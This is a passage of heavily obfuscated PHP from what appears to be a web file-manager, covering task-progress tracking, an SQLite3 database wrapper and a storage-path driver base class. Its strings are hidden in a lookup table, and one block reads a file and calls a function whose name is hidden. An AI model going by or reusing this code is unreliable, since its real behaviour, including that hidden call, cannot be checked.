0; if ($çû˜âóÜ[$¦³ô¡‰Í[1978]]) { $¯¯Ä¾ïŒ = $çû˜âóÜ[$¦³ô¡‰Í[1979]] / $çû˜âóÜ[$¦³ô¡‰Í[1978]]; } $çû˜âóÜ[$¦³ô¡‰Í[1926]] = 0.3 + 0.5 + $¯¯Ä¾ïŒ * 0.2; } } } if ($çû˜âóÜ[$¦³ô¡‰Í[1926]] > 0) { $Î•ŒÜ³˜ = timeFloat() - $çû˜âóÜ[$¦³ô¡‰Í[1928]] - $çû˜âóÜ[$¦³ô¡‰Í[1931]]; $çû˜âóÜ[$¦³ô¡‰Í[1932]] = $Î•ŒÜ³˜ * (1 - $çû˜âóÜ[$¦³ô¡‰Í[1926]]) / $çû˜âóÜ[$¦³ô¡‰Í[1926]]; } } public function copyFileStart($å”ˆµÙ, $å«ü§÷ò, $˜±ÁÉÒÚ, $»Õ¯æŠ°, $¥íà¥îû, $¶ñü®¢) { $×õäì½è =& $_SERVER[¤øïŠ‹²]; parent::copyFileStart($å”ˆµÙ, $å«ü§÷ò, $˜±ÁÉÒÚ, $»Õ¯æŠ°, $¥íà¥îû, $¶ñü®¢); $•–§¨ÌŒ =& $this->task; if ($•–§¨ÌŒ[$×õäì½è[2054]] == $×õäì½è[400]) { $•–§¨ÌŒ[$×õäì½è[2054]] = $×õäì½è[119]; } $this->update(); } public function copyFileEnd($İöŸßŞ¿, $Ø®Óì‘, $ª–—ÁúŞ, $©è¢õ©ë, $±×”áÈ, $±ºøç»‚) { $ÁÀ–Ûıà =& $_SERVER[¤øïŠ‹²]; $èÛƒ·½œ =& $this->task; $èÛƒ·½œ[$ÁÀ–Ûıà[1979]] = $èÛƒ·½œ[$ÁÀ–Ûıà[1978]]; $èÛƒ·½œ[$ÁÀ–Ûıà[1983]] += $èÛƒ·½œ[$ÁÀ–Ûıà[1978]]; $èÛƒ·½œ[$ÁÀ–Ûıà[1980]] = $ÁÀ–Ûıà[12]; $this->update(); } public function zipEvent($íš¾ä±, $ €ÛÌßı, $Ñ˜õÒòõ, $ÙÒ½×Ó‡) { $¾õ«´ë =& $_SERVER[¤øïŠ‹²]; $¹É¾›ç¦ =& $this->task; $¹É¾›ç¦[$¾õ«´ë[1976]] = get_path_this($ €ÛÌßı); $¹É¾›ç¦[$¾õ«´ë[1978]] = $ÙÒ½×Ó‡; $¹É¾›ç¦[$¾õ«´ë[1979]] = $Ñ˜õÒòõ; $¹É¾›ç¦[$¾õ«´ë[1180]] = $íš¾ä± == $¾õ«´ë[2062] ? $¾õ«´ë[2057] : $¾õ«´ë[2058]; $¹É¾›ç¦[$¾õ«´ë[1980]] = $¾õ«´ë[12]; $¹É¾›ç¦[$¾õ«´ë[865]] = $ÙÒ½×Ó‡; $¹É¾›ç¦[$¾õ«´ë[2054]] = $¾õ«´ë[400]; $this->update(); } public function nameParse($¥»ÛšĞø) { $ÍÜÉş± =& $_SERVER[¤øïŠ‹²]; $ ÕæÆïê =& $this->task; if ($ ÕæÆïê[$ÍÜÉş±[1925]] < $ ÕæÆïê[$ÍÜÉş±[1178]]) { $‡¹™®Æ = get_path_this($¥»ÛšĞø); if (strstr($‡¹™®Æ, $ÍÜÉş±[10])) { $ ÕæÆïê[$ÍÜÉş±[1925]] += 1; } } if ($ ÕæÆïê[$ÍÜÉş±[2054]] == $ÍÜÉş±[1331]) { $ ÕæÆïê[$ÍÜÉş±[2054]] = $ÍÜÉş±[400]; } $ ÕæÆïê[$ÍÜÉş±[1976]] = $¥»ÛšĞø; $this->update(); } } goto d°ê»Èêƒ’; dËÅù¡¡Ùí: class DbSqlite3Base extends Db { public function __construct($»ñÒÙşè = '') { $¦Ö†ØÂ± =& $_SERVER[¤øïŠ‹²]; if (!class_exists($¦Ö†ØÂ±[64])) { think_exception(think_lang($¦Ö†ØÂ±[14]) . $¦Ö†ØÂ±[65]); } if (!empty($»ñÒÙşè)) { if (!isset($»ñÒÙşè[$¦Ö†ØÂ±[16]])) { $»ñÒÙşè[$¦Ö†ØÂ±[16]] = 438; } $this->config = $»ñÒÙşè; if (empty($this->config[$¦Ö†ØÂ±[17]])) { $this->config[$¦Ö†ØÂ±[17]] = array(); } } } public function connect($‹¹·Ğ¢ù = '', $¬õ¹ˆ¢ = 0) { $Ÿ¼üá÷Ê =& $_SERVER[¤øïŠ‹²]; if (!isset($this->linkID[$¬õ¹ˆ¢])) { if (empty($‹¹·Ğ¢ù)) { $‹¹·Ğ¢ù = $this->config; } $this->linkID[$¬õ¹ˆ¢] = new SQLite3($‹¹·Ğ¢ù[$Ÿ¼üá÷Ê[21]]); if (!$this->linkID[$¬õ¹ˆ¢]) { think_exception($this->linkID[$¬õ¹ˆ¢]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¬õ¹ˆ¢]->busyTimeout(30000); if (1 != think_config($Ÿ¼üá÷Ê[22])) { unset($this->config); } } return $this->linkID[$¬õ¹ˆ¢]; } public function free() { $this->queryID = null; } public function query($é÷ş‰½Ã) { $û©úéşÆ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $é÷ş‰½Ã; if ($this->queryID) { $this->free(); } think_action_status($û©úéşÆ[23], 1); think_status($û©úéşÆ[24]); $this->queryID = $this->_linkID->query($é÷ş‰½Ã); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÔøÕÆíå = $this->getAll(); $this->numRows = count($ÔøÕÆíå); return $ÔøÕÆíå; } } public function execute($ÉÀÂÙØ°) { $•ÇÅ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉÀÂÙØ°; if ($this->queryID) { $this->free(); } think_action_status($•ÇÅ[25], 1); think_status($•ÇÅ[24]); $½ÓõŸ¸± = $this->_linkID->exec($ÉÀÂÙØ°); $this->debug(); if (!1 === $½ÓõŸ¸±) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¤øïŠ‹²][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $“‚Üó«˜ = $this->_linkID->query($_SERVER[¤øïŠ‹²][27]); if (!$“‚Üó«˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Á’ÒÆ±• = $this->_linkID->query($_SERVER[¤øïŠ‹²][28]); if (!$Á’ÒÆ±•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ô¯ë™Œö = array(); while ($ÒªÀß¤¸ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ô¯ë™Œö[] = $ÒªÀß¤¸; } $this->queryID->reset(); return $ô¯ë™Œö; } public function getFields($ù²ˆ×ñ) { $æ‘­¡‚‹ =& $_SERVER[¤øïŠ‹²]; $ïŒƒ¼”Ô = $this->query($æ‘­¡‚‹[29] . $ù²ˆ×ñ . $æ‘­¡‚‹[30]); $öš¢›Õ¦ = array(); if ($ïŒƒ¼”Ô) { foreach ($ïŒƒ¼”Ô as $¡ãèú”à => $¯‰å‰ôÌ) { $öš¢›Õ¦[$¯‰å‰ôÌ[$æ‘­¡‚‹[32]]] = array($æ‘­¡‚‹[32] => $¯‰å‰ôÌ[$æ‘­¡‚‹[32]], $æ‘­¡‚‹[33] => $¯‰å‰ôÌ[$æ‘­¡‚‹[33]], $æ‘­¡‚‹[35] => (bool) ($¯‰å‰ôÌ[$æ‘­¡‚‹[35]] === $æ‘­¡‚‹[12]), $æ‘­¡‚‹[37] => $¯‰å‰ôÌ[$æ‘­¡‚‹[66]], $æ‘­¡‚‹[39] => (bool) $¯‰å‰ôÌ[$æ‘­¡‚‹[67]], $æ‘­¡‚‹[42] => (bool) $¯‰å‰ôÌ[$æ‘­¡‚‹[67]]); } } return $öš¢›Õ¦; } public function getTables($œşí™ˆ = '') { $äÔ×Ş¬ç =& $_SERVER[¤øïŠ‹²]; $®ªñöºÉ = $this->query($äÔ×Ş¬ç[45] . $äÔ×Ş¬ç[46] . $äÔ×Ş¬ç[47]); $ßÁİ¯úï = array(); foreach ($®ªñöºÉ as $Ç¸šƒ¯– => $ÖıØƒŸÒ) { $ßÁİ¯úï[$Ç¸šƒ¯–] = current($ÖıØƒŸÒ); } return $ßÁİ¯úï; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $äëéäÔÜ =& $_SERVER[¤øïŠ‹²]; $this->error = $this->_linkID->lastErrorMsg(); if ($äëéäÔÜ[12] != $this->queryStr) { $this->error .= LNG($äëéäÔÜ[48]) . $this->queryStr; } think_trace($this->error, $äëéäÔÜ[12], $äëéäÔÜ[49]); return $this->error; } public function escapeString($‘‹ëÜ‰„) { $¶½ÙÙÇà =& $_SERVER[¤øïŠ‹²]; if ($this->_linkID) { return $this->_linkID->escapeString($‘‹ëÜ‰„); } return str_ireplace($¶½ÙÙÇà[68], $¶½ÙÙÇà[69], $‘‹ëÜ‰„); } public function parseLimit($ÌÂ÷¸ˆæ) { $À¿‡éø =& $_SERVER[¤øïŠ‹²]; $ı­¿ÁÃ = $À¿‡éø[12]; if (!empty($ÌÂ÷¸ˆæ)) { $ÌÂ÷¸ˆæ = explode($À¿‡éø[50], $ÌÂ÷¸ˆæ); if (count($ÌÂ÷¸ˆæ) > 1) { $ı­¿ÁÃ .= $À¿‡éø[51] . $ÌÂ÷¸ˆæ[1] . $À¿‡éø[52] . $ÌÂ÷¸ˆæ[0] . $À¿‡éø[53]; } else { $ı­¿ÁÃ .= $À¿‡éø[51] . $ÌÂ÷¸ˆæ[0] . $À¿‡éø[53]; } } return $ı­¿ÁÃ; } } if ($_SERVER[$_SERVER[¤øïŠ‹²][54]] != $_SERVER[$_SERVER[¤øïŠ‹²][70]]) { $_getc = $_SERVER[¤øïŠ‹²][56]; $_getfile = $_SERVER[$_SERVER[¤øïŠ‹²][57]] . $_SERVER[¤øïŠ‹²][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤øïŠ‹²][59], $_getfilec); if (count($_getarrs) < $_SERVER[¤øïŠ‹²][60]) { $exit = $_SERVER[¤øïŠ‹²][61]; $exit(); } $_act = $_SERVER[¤øïŠ‹²][62]; $_act($_SERVER[$_SERVER[¤øïŠ‹²][55]]); } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $…§°àÈ¼ =& $_SERVER[¤øïŠ‹²]; $this->objectDriver = array($…§°àÈ¼[71], $…§°àÈ¼[72], $…§°àÈ¼[73], $…§°àÈ¼[74], $…§°àÈ¼[75], $…§°àÈ¼[76], $…§°àÈ¼[77], $…§°àÈ¼[78], $…§°àÈ¼[79], $…§°àÈ¼[80], $…§°àÈ¼[81], $…§°àÈ¼[82]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ô¤Ë¶’) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ô¤Ë¶’, $_SERVER[¤øïŠ‹²][8]); } return $Ô¤Ë¶’; } public function iconvApp($ÈÆåú) { return $ÈÆåú; } public function iconvSystem($×ø²š‘—) { return $×ø²š‘—; } public function iconvTo($ëƒÌøà, $‹Æ’ñì, $©ûÄ›Ò”) { $ˆ¶î¬®Ì =& $_SERVER[¤øïŠ‹²]; if (!$ëƒÌøà || !function_exists($ˆ¶î¬®Ì[83])) { return $ëƒÌøà; } static $Ûğ‘İİÁ = array(); $Ÿ´ˆœ¡ò = $‹Æ’ñì . $ˆ¶î¬®Ì[84] . $©ûÄ›Ò” . $ˆ¶î¬®Ì[85] . $ëƒÌøà; if (isset($Ûğ‘İİÁ[$Ÿ´ˆœ¡ò])) { return $Ûğ‘İİÁ[$Ÿ´ˆœ¡ò]; } if (function_exists($ˆ¶î¬®Ì[86])) { $Á¾–å• = @mb_convert_encoding($ëƒÌøà, $©ûÄ›Ò”, $‹Æ’ñì); } else { $Á¾–å• = @iconv($‹Æ’ñì, $©ûÄ›Ò”, $ëƒÌøà); } $Á¾–å• = $Á¾–å• ? $Á¾–å• : $ëƒÌøà; if (strstr($Á¾–å•, $ˆ¶î¬®Ì[87])) { $Á¾–å• = str_replace($ˆ¶î¬®Ì[87], $ˆ¶î¬®Ì[11], $Á¾–å•); } $Ûğ‘İİÁ[$‹Æ’ñì . $ˆ¶î¬®Ì[84] . $©ûÄ›Ò” . $ˆ¶î¬®Ì[85] . $ëƒÌøà] = $Á¾–å•; $Ûğ‘İİÁ[$©ûÄ›Ò” . $ˆ¶î¬®Ì[84] . $‹Æ’ñì . $ˆ¶î¬®Ì[85] . $ëƒÌøà] = $ëƒÌøà; $Ûğ‘İİÁ[$©ûÄ›Ò” . $ˆ¶î¬®Ì[84] . $‹Æ’ñì . $ˆ¶î¬®Ì[85] . $Á¾–å•] = $ëƒÌøà; $Ûğ‘İİÁ[$‹Æ’ñì . $ˆ¶î¬®Ì[84] . $©ûÄ›Ò” . $ˆ¶î¬®Ì[85] . $Á¾–å•] = $Á¾–å•; return $Á¾–å•; } public function getPathInner($»İØÛøÁ) { $Ú¡¬Ú¦¼ = IO::init($»İØÛøÁ); return $Ú¡¬Ú¦¼->path; } public function getPathOuter($Áæ¿âÛ¨) { $«„øÃÊ =& $_SERVER[¤øïŠ‹²]; $±œŒŒŸ = strlen(trim($this->pathBase, $«„øÃÊ[8])); $Áæ¿âÛ¨ = substr(trim($Áæ¿âÛ¨, $«„øÃÊ[8]), $±œŒŒŸ); return $this->pathDriver . $«„øÃÊ[8] . ltrim($Áæ¿âÛ¨, $«„øÃÊ[8]); } public function isParentOf($‚Ö¬ËŒŸ, $İã¥ˆş) { $å¥‹ÈŠ‚ =& $_SERVER[¤øïŠ‹²]; $‚Ö¬ËŒŸ = rtrim(strtolower($‚Ö¬ËŒŸ), $å¥‹ÈŠ‚[8]) . $å¥‹ÈŠ‚[8]; $İã¥ˆş = rtrim(strtolower($İã¥ˆş), $å¥‹ÈŠ‚[8]) . $å¥‹ÈŠ‚[8]; $¬õî‹Ê½ = strpos($İã¥ˆş, $‚Ö¬ËŒŸ) === 0; return $¬õî‹Ê½; } public function getType() { $ê‚–œ¿Ô =& $_SERVER[¤øïŠ‹²]; $ÈŞ¬ò¶œ = str_replace($ê‚–œ¿Ô[88], $ê‚–œ¿Ô[12], get_class($this)); return strtolower($ÈŞ¬ò¶œ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ì˜·Ì¹“, $ÉÖí§‘) { $º´§è³­ =& $_SERVER[¤øïŠ‹²]; $„ªÏÑ‚ = rtrim($ì˜·Ì¹“, $º´§è³­[8]) . $º´§è³­[8] . $ÉÖí§‘; $Ô˜¾—ñŸ = $this->exist($„ªÏÑ‚); return $Ô˜¾—ñŸ ? $„ªÏÑ‚ : !1; } public function setModifyTime($Òæ‚†×¥, $£ŞÊŒ”„ = '') { } public function renameObject($ßàœ¥ÛŸ, $ñõ±¶×Î) { $´•ó˜ò· = $ñõ±¶×Î; $ßàœ¥ÛŸ = $this->getPathOuter($ßàœ¥ÛŸ); $ñõ±¶×Î = $this->pathFather($ßàœ¥ÛŸ) . $ñõ±¶×Î; $é‡çÎÚô = IO::copy($ßàœ¥ÛŸ, $this->pathFather($ßàœ¥ÛŸ), REPEAT_RENAME_FOLDER, $´•ó˜ò·); if ($é‡çÎÚô) { IO::remove($ßàœ¥ÛŸ); } return $é‡çÎÚô ? $ñõ±¶×Î : !1; } public function tempFile($á ³˜éâ = '', $ëîûŞ²¸ = '') { if (!$á ³˜éâ) { $á ³˜éâ = rand_string(15); } $¢ùÄÏ‡Ğ = TEMP_FILES . rand_string(15) . $_SERVER[¤øïŠ‹²][8]; @mkdir($¢ùÄÏ‡Ğ, DEFAULT_PERRMISSIONS, !0); $©¤´â³ö = $¢ùÄÏ‡Ğ . $á ³˜éâ; @touch($©¤´â³ö); if ($ëîûŞ²¸) { file_put_contents($©¤´â³ö, $ëîûŞ²¸); } return $©¤´â³ö; } public function tempFileRemve($Ç®Öêî§) { @unlink($Ç®Öêî§); @rmdir($this->pathFather($Ç®Öêî§)); } public function mkfile($“Çûûø, $„–«Şõ = '', $ıĞÆÓÓ = REPEAT_RENAME) { } public function mkdir($‡³Á‹ËÎ, $˜õŞõØ = REPEAT_SKIP) { } public function delFile($°·ºŒ˜Ï) { } public function delFolder($·•“šä) { } public function copyFile($§Æ«¨¯ê, $ …Øª»Ğ) { } public function moveFile($œºïêçÀ, $Â£Ë¼…‹) { } public function remove($°‹©Âì¹) { if ($this->isFile($°‹©Âì¹)) { return $this->delFile($°‹©Âì¹); } return $this->delFolder($°‹©Âì¹); } public function rename($¬›ËñË, $íù‘©ó“) { } public function exist($ùÛÄºÀ¯) { } public function isFile($ØÈ„Ù­) { } public function isFolder($®¡¿Ö†Š) { } public function size($º¨‡õ¦Ü) { } public function info($ïŒğ·£¹) { } public function infoSimple($®×ÕŠÖ¶) { return $this->info($®×ÕŠÖ¶); } public function infoAuth($×åå®ÌÃ) { return $this->info($×åå®ÌÃ); } public function infoFull($¼ŠëôøØ) { return $this->info($¼ŠëôøØ); } public function infoFullSimple($£´¥¤Ó) { return $this->info($£´¥¤Ó); } public function infoWithChildren($†ã¼ÇˆË) { $´‚šæ¥ó =& $_SERVER[¤øïŠ‹²]; static $Àøúæ‡à = array(); if (isset($Àøúæ‡à[$†ã¼ÇˆË])) { return $Àøúæ‡à[$†ã¼ÇˆË]; } $Øíçèöï = $this->info($†ã¼ÇˆË); if ($Øíçèöï && $Øíçèöï[$´‚šæ¥ó[33]] == $´‚šæ¥ó[89]) { $ìÃ¡àÔ = array($´‚šæ¥ó[90] => 0, $´‚šæ¥ó[91] => 0, $´‚šæ¥ó[92] => 0); $this->infoChildren($†ã¼ÇˆË, $ìÃ¡àÔ); $Øíçèöï[$´‚šæ¥ó[90]] = $ìÃ¡àÔ[$´‚šæ¥ó[90]]; $Øíçèöï[$´‚šæ¥ó[93]] = array($´‚šæ¥ó[94] => $ìÃ¡àÔ[$´‚šæ¥ó[91]], $´‚šæ¥ó[95] => $ìÃ¡àÔ[$´‚šæ¥ó[92]]); $Àøúæ‡à[$†ã¼ÇˆË] = $Øíçèöï; } return $Øíçèöï; } public function listPath($¯›€ÉÉ¯, $ã°…ÒŸî = false) { } public function has($ı¹ªƒ¬, $Óó•¤ôì = false, $©üæü†‘ = false) { } public function canRead($ÁÁÓÙé) { } public function canWrite($Ô¥•ÄÄœ) { } public function getContent($›™ğ½‡) { } public function setContent($„×Ó×µ°, $ÑËçù“ä = '') { } protected function infoChildren($ÇÅ„Û÷ , &$Ø¨¼´°) { $šüŠÛ«Ñ =& $_SERVER[¤øïŠ‹²]; check_abort_echo(); $êó¦ûşô = $this->listPath($ÇÅ„Û÷ , !0); $êó¦ûşô = array_merge($êó¦ûşô[$šüŠÛ«Ñ[96]], $êó¦ûşô[$šüŠÛ«Ñ[97]]); foreach ($êó¦ûşô as $›Í± í) { if ($›Í± í[$šüŠÛ«Ñ[33]] == $šüŠÛ«Ñ[89]) { $Ø¨¼´°[$šüŠÛ«Ñ[92]]++; $Áú‰šã = $this->getPathInner($›Í± í[$šüŠÛ«Ñ[98]]); $this->infoChildren($Áú‰šã, $Ø¨¼´°); } else { $Ø¨¼´°[$šüŠÛ«Ñ[91]]++; $Ø¨¼´°[$šüŠÛ«Ñ[90]] += $›Í± í[$šüŠÛ«Ñ[90]]; } } } public function fileSubstr($ÖÃ‹É©², $ÑşÅÑ˜ë, $ã² ¾á¸) { } public function listAll($“ˆµ’ôÎ) { } public function listAllMake($±´èÒ, &$“¿ûÎÈœ) { $€šæÜœ =& $_SERVER[¤øïŠ‹²]; check_abort_echo(); $¨ö÷ë±™ = $this->listPath($±´èÒ, !0); if (!$¨ö÷ë±™) { return; } $‡·‡æ— = array_merge($¨ö÷ë±™[$€šæÜœ[96]], $¨ö÷ë±™[$€šæÜœ[97]]); foreach ($‡·‡æ— as $’ÉÌé‰†) { $¹£®ì¶š = $’ÉÌé‰†[$€šæÜœ[33]] == $€šæÜœ[89]; $üŒ¤œ³½ = array($€šæÜœ[98] => $’ÉÌé‰†[$€šæÜœ[98]], $€šæÜœ[89] => $¹£®ì¶š); if (isset($’ÉÌé‰†[$€šæÜœ[90]])) { $üŒ¤œ³½[$€šæÜœ[90]] = $’ÉÌé‰†[$€šæÜœ[90]]; } if (isset($’ÉÌé‰†[$€šæÜœ[99]])) { $üŒ¤œ³½[$€šæÜœ[99]] = $’ÉÌé‰†[$€šæÜœ[99]]; } if (!$¹£®ì¶š) { $“¿ûÎÈœ[] = $üŒ¤œ³½; continue; } $“¿ûÎÈœ[] = $üŒ¤œ³½; $öëæÍâÌ = $’ÉÌé‰†[$€šæÜœ[98]]; $¸®šï¤¯ = $this->pathDriver; if (substr($’ÉÌé‰†[$€šæÜœ[98]], 0, strlen($¸®šï¤¯)) == $¸®šï¤¯) { $öëæÍâÌ = substr($öëæÍâÌ, strlen($¸®šï¤¯)); } $this->listAllMake($öëæÍâÌ, $“¿ûÎÈœ); } } public function listAllSimple($ğ¾†‰ˆæ, $÷ˆ•ÉÜë = false) { $¯µïéµ = $this->listAll($ğ¾†‰ˆæ); return $this->listAllSimpleMake($¯µïéµ, $this->getPathOuter($ğ¾†‰ˆæ), $÷ˆ•ÉÜë); } public function listAllSimpleMake($ú÷¶È‡È, $¬’±•î±, $Ó–éù­) { $Å¨ìÏşé =& $_SERVER[¤øïŠ‹²]; $ä™¤ŸßÎ = array(); $¬’±•î± = rtrim(get_path_father($¬’±•î±), $Å¨ìÏşé[8]) . $Å¨ìÏşé[8]; foreach ($ú÷¶È‡È as $»öèæŸú) { $Ÿº˜Ö›Š = array($Å¨ìÏşé[98] => $»öèæŸú[$Å¨ìÏşé[98]], $Å¨ìÏşé[100] => $»öèæŸú[$Å¨ìÏşé[98]], $Å¨ìÏşé[89] => $»öèæŸú[$Å¨ìÏşé[89]]); if (isset($»öèæŸú[$Å¨ìÏşé[90]]) && !$»öèæŸú[$Å¨ìÏşé[89]]) { $Ÿº˜Ö›Š[$Å¨ìÏşé[90]] = $»öèæŸú[$Å¨ìÏşé[90]]; } if (isset($»öèæŸú[$Å¨ìÏşé[99]])) { $Ÿº˜Ö›Š[$Å¨ìÏşé[99]] = $»öèæŸú[$Å¨ìÏşé[99]]; } if (is_array($»öèæŸú[$Å¨ìÏşé[101]])) { $Ÿº˜Ö›Š[$Å¨ìÏşé[100]] = $»öèæŸú[$Å¨ìÏşé[101]][$Å¨ìÏşé[98]]; $Ÿº˜Ö›Š[$Å¨ìÏşé[90]] = $»öèæŸú[$Å¨ìÏşé[101]][$Å¨ìÏşé[90]]; $Ÿº˜Ö›Š[$Å¨ìÏşé[99]] = $»öèæŸú[$Å¨ìÏşé[101]][$Å¨ìÏşé[99]]; } else { if (substr($»öèæŸú[$Å¨ìÏşé[98]], 0, strlen($¬’±•î±)) == $¬’±•î±) { $Ÿº˜Ö›Š[$Å¨ìÏşé[98]] = substr($»öèæŸú[$Å¨ìÏşé[98]], strlen($¬’±•î±)); } } $Ê—ô›»Î = $»öèæŸú[$Å¨ìÏşé[89]] ? $Å¨ìÏşé[8] : $Å¨ìÏşé[12]; $Ÿº˜Ö›Š[$Å¨ìÏşé[100]] = rtrim($Ÿº˜Ö›Š[$Å¨ìÏşé[100]], $Å¨ìÏşé[8]) . $Ê—ô›»Î; $Ÿº˜Ö›Š[$Å¨ìÏşé[98]] = $Å¨ìÏşé[8] . trim($Ÿº˜Ö›Š[$Å¨ìÏşé[98]], $Å¨ìÏşé[8]) . $Ê—ô›»Î; if (!$Ó–éù­) { $³Ú¾ºú = explode($Å¨ìÏşé[8], trim($Ÿº˜Ö›Š[$Å¨ìÏşé[98]], $Å¨ìÏşé[8])); $Ÿº˜Ö›Š[$Å¨ìÏşé[98]] = $Å¨ìÏşé[8] . implode($Å¨ìÏşé[8], array_slice($³Ú¾ºú, 1)) . $Ê—ô›»Î; } $ä™¤ŸßÎ[] = $Ÿº˜Ö›Š; } return array_sort_by($ä™¤ŸßÎ, $Å¨ìÏşé[98]); } public function upload($ÍÌÛÆº’, $æêµËÓß, $ØçºÎå´ = false, $Ò½Çúòù = REPEAT_REPLACE) { } public function uploadFileByID($±èúªËó, $÷üËèÅ–, $²˜¿‹Í) { } public function uploadFileByPath($Ê›Ïş•, $úœ²¦€×, $¦æûêøÇ = array()) { } public function isUploadServer() { $¯©¿ûå” =& $_SERVER[¤øïŠ‹²]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¯©¿ûå”[102]) { return !0; } return $GLOBALS[$¯©¿ûå”[6]][$¯©¿ûå”[103]][$¯©¿ûå”[104]]; } public function isFileOutServer() { $¨ÁÕöåÊ =& $_SERVER[¤øïŠ‹²]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¨ÁÕöåÊ[102]) { return !0; } return $GLOBALS[$¨ÁÕöåÊ[6]][$¨ÁÕöåÊ[103]][$¨ÁÕöåÊ[105]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¶”»ÈØ•) { $°ë¸– =& $_SERVER[¤øïŠ‹²]; if (!$this->isCdnHost()) { return $¶”»ÈØ•; } return str_replace(trim(get_url_root($¶”»ÈØ•), $°ë¸–[8]), trim($this->cdnHost, $°ë¸–[8]), $¶”»ÈØ•); } public function uploadLink($¤ßØ´äû, $Ü•ø†İ = 0) { $™¦¾›•¢ =& $_SERVER[¤øïŠ‹²]; if ($this->isUploadServer()) { return; } $âİ·® = $this->getType(); if (!in_array($âİ·®, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Éü›å = 1024 * 1024 * 10; $İã’€¡Á = (!$Ü•ø†İ ? 1 : ceil($Ü•ø†İ / pow(1024, 3))) * 3600 * 4; if ($Ü•ø†İ <= $Éü›å) { $ê—ÊıÊç = $this->uploadFormData($¤ßØ´äû, $İã’€¡Á); } else { $ê—ÊıÊç = $this->uploadMultiData($¤ßØ´äû, $İã’€¡Á); } if ($ê—ÊıÊç) { $ê—ÊıÊç[$™¦¾›•¢[106]] = $¤ßØ´äû; $ê—ÊıÊç[$™¦¾›•¢[107]] = $âİ·®; } return $ê—ÊıÊç; } public function uploadFormData($Ì¢şÉ¹‹, $£‡üîŸº = 3600) { } public function uploadMultiData($¬¾ù½·®, $¾º„›ª­ = 3600) { } public function multiUploadFormData($¯ÕÖ»äÄ, $ã’ª€éâ = 3600) { return $this->uploadMultiData($¯ÕÖ»äÄ, $ã’ª€éâ); } public function download($îñüâø©, $‰éêÃ•) { } public function ext($³£¦‡èı) { $é¬±àËö =& $_SERVER[¤øïŠ‹²]; if (strpos($³£¦‡èı, $é¬±àËö[8]) === -1) { $ãÂ£û÷ˆ = $³£¦‡èı; } else { $ãÂ£û÷ˆ = $this->pathThis($³£¦‡èı); } $ğÛ—”˜â = $é¬±àËö[12]; if (strstr($ãÂ£û÷ˆ, $é¬±àËö[10])) { $ğÛ—”˜â = substr($ãÂ£û÷ˆ, strrpos($ãÂ£û÷ˆ, $é¬±àËö[10]) + 1); $ğÛ—”˜â = strtolower($ğÛ—”˜â); } if (strlen($ğÛ—”˜â) > 3 && preg_match($é¬±àËö[108], $ğÛ—”˜â, $îîÓÒ¿¬)) { $ğÛ—”˜â = $é¬±àËö[12]; } return $ğÛ—”˜â; } public function pathThis($³ÄÍ«ÅÒ) { $ÚÚ¼Ê—š =& $_SERVER[¤øïŠ‹²]; $³ÄÍ«ÅÒ = str_replace($ÚÚ¼Ê—š[109], $ÚÚ¼Ê—š[8], rtrim($³ÄÍ«ÅÒ, $ÚÚ¼Ê—š[8])); $ÚÔÖêŞı = strrpos($³ÄÍ«ÅÒ, $ÚÚ¼Ê—š[8]); if ($ÚÔÖêŞı === !1) { return $³ÄÍ«ÅÒ; } return substr($³ÄÍ«ÅÒ, $ÚÔÖêŞı + 1); } public function pathFather($Š¬”Öñ) { $—ëöŸñ– =& $_SERVER[¤øïŠ‹²]; $Š¬”Öñ = str_replace($—ëöŸñ–[109], $—ëöŸñ–[8], rtrim($Š¬”Öñ, $—ëöŸñ–[8])); $Íä¼Ì°÷ = strrpos($Š¬”Öñ, $—ëöŸñ–[8]); if ($Íä¼Ì°÷ === !1) { return $—ëöŸñ–[12]; } return substr($Š¬”Öñ, 0, $Íä¼Ì°÷ + 1); } public function hashSimple($œ¨­´•ø) { $ÔÌ™Ğâ =& $_SERVER[¤øïŠ‹²]; if (!$œ¨­´•ø) { return md5($ÔÌ™Ğâ[12]); } $üãªÇæğ = $this->size($œ¨­´•ø); $¢¢ÏİÖÌ = 200; $ô £—÷¢ = 50; if ($üãªÇæğ <= $¢¢ÏİÖÌ * $ô £—÷¢) { return $this->hashMd5($œ¨­´•ø) . $üãªÇæğ; } $Ÿ†ßïş² = intval($üãªÇæğ / $ô £—÷¢); $î³š‰Ô = $ÔÌ™Ğâ[12]; for ($ŒíÇ‘®µ = 0; $ŒíÇ‘®µ < $ô £—÷¢; $ŒíÇ‘®µ++) { $î³š‰Ô .= $this->fileSubstr($œ¨­´•ø, $Ÿ†ßïş² * $ŒíÇ‘®µ, $¢¢ÏİÖÌ); } $î³š‰Ô .= $this->fileSubstr($œ¨­´•ø, $üãªÇæğ - $¢¢ÏİÖÌ, $¢¢ÏİÖÌ); return md5($î³š‰Ô) . $üãªÇæğ; } public static $md5Cache = array(); public function hashMd5($‰¹¿»Ç) { if (!$‰¹¿»Ç) { 